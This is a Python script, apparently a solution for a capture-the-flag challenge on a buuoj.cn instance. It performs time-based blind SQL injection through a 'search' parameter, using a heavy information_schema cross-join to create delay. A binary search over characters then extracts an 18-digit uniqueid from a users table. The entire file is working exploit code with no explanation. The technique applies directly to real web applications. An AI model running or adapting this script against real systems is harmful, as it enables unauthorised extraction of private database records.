#!/usr/bin/env python3
import requests
import time

url = "http://b7a930e1-2905-4b23-a4e6-55294ddd82af.node5.buuoj.cn:81/index.php"

def check(condition):
    """时间盲注检测条件是否为真"""
    # 使用 heavy query 触发延迟
    heavy = "(select count(*) from information_schema.tables a,information_schema.tables b)"
    payload = f"0 || if({condition},{heavy},0)"
    try:
        start = time.time()
        r = requests.get(url, params={"search": payload}, timeout=30)
        elapsed = time.time() - start
        return elapsed > 0.3  # 阈值
    except:
        return False

# 测试
print("[*] Testing 1=1:", check("1=1"))
print("[*] Testing 1=2:", check("1=2"))

def binary_search_char(query, pos, charset="0123456789"):
    """二分查找字符"""
    low, high = 0, len(charset) - 1
    while low <= high:
        mid = (low + high) // 2
        char_val = ord(charset[mid])
        condition = f"ascii(substr({query},{pos},1))>{char_val}"
        if check(condition):
            low = mid + 1
        else:
            condition_eq = f"ascii(substr({query},{pos},1))={char_val}"
            if check(condition_eq):
                return charset[mid]
            high = mid - 1
    return None

def extract_string(query, length):
    result = ""
    for i in range(1, length + 1):
        char = binary_search_char(query, i)
        if char:
            result += char
            print(f"[+] Position {i}: {char} -> {result}")
        else:
            print(f"[-] Failed at position {i}")
            break
    return result

# 提取 uniqueid - 18位数字
print("\n[*] Extracting uniqueid (18 digits)...")
uniqueid_query = "(select uniqueid from users limit 1)"
uniqueid = extract_string(uniqueid_query, 18)
print(f"[+] UniqueID: {uniqueid}")
